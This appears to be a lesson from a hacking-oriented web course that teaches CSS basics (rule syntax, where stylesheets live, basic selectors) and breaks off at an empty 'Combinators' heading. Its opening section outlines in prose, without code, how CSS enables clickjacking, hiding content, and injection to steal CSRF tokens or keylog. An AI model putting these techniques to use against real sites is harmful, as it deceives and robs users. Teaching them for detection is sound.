Welcome to Week 10! You have a skeleton website; now it’s time to clothe it in visual appeal. CSS (Cascading Style Sheets) is the language that controls presentation – colors, layout, fonts, spacing, and even animations. For a hacker, CSS is not just about making things pretty: understanding it lets you detect hidden elements (like admin panels reachable via display:none), exploit UI redress attacks (clickjacking), manipulate pages via CSS injection, steal data with attribute selectors, and create convincing phishing clones. However, this week we focus on becoming fluent in CSS so you can later recognise when something is wrong.

By the end of this week, you’ll have transformed your bare portfolio into a visually appealing, responsive website with a dark/light mode toggle – all from scratch. You’ll understand the box model, flexbox, grid, and media queries. And you’ll have built your first interactive theme switcher using CSS custom properties and a pinch of JavaScript.

docs.title: Part I – Why CSS Matters for Web Exploitation
1.1 Information Disclosure Through Styles
docs.text:
• Hidden elements: display: none; or visibility: hidden; may hide admin links or debug info. A pentester always checks the CSS (and overrides it) to see what’s concealed.
  • Content masking: developers sometimes use font-size: 0; or opacity: 0; to hide text. Inspecting the computed style reveals it.
  • Attribute selectors in CSS can be abused to extract sensitive data (CSS injection + exfiltration), but we’ll cover that in advanced attacks.

docs.title: 1.2 UI Redress and Clickjacking
docs.text: • An attacker can use CSS to place an invisible iframe over a legitimate button, making the user click something they didn’t intend. Understanding position, z-index, and opacity helps you detect and prevent this.

docs.title: 1.3 CSS Injection
docs.text:
If you can inject a <style> block or a style attribute, you can deface a page, steal CSRF tokens, or even keylog (with complex selectors). We’ll treat this later; for now, know that CSS is not harmless.

Nevertheless, this week is about building the skill. A good hacker knows the technology better than the developer.

docs.title: Part II – CSS Fundamentals: Syntax, Selectors, and the Cascade
2.1 How CSS Works
docs.text:
CSS is a list of rules. Each rule consists of a selector and a declaration block:

selector {
    property: value;
    property: value;
}
  • The selector targets HTML elements.
  • The declaration block contains one or more declarations, each a property–value pair ending with a semicolon.
  • Comments: /* comment */

docs.title: 2.2 Where CSS Lives
docs.text:
1. External stylesheet (<link rel="stylesheet" href="style.css">) – best practice.
  2. Internal stylesheet within <style> tags in <head>.
  3. Inline styles using the style attribute on an element: <p style="color: red;">. Highest specificity (usually overrides other rules).

Attack note: If you can inject inline style attributes or <style> blocks, you can override any existing style, hide warnings, or modify layout to deceive users.

docs.title: 2.3 Basic Selectors
docs.text:
• Type selector: h1 { color: blue; } – all <h1> elements.
  • Class selector: .highlight { background: yellow; } – any element with class="highlight". Use multiple classes: .btn.primary.
  • ID selector: #logo { width: 200px; } – the element with id="logo" (IDs should be unique).
  • Universal selector: * { box-sizing: border-box; } – all elements.

docs.title: 2.4 Combinators
docs.text:
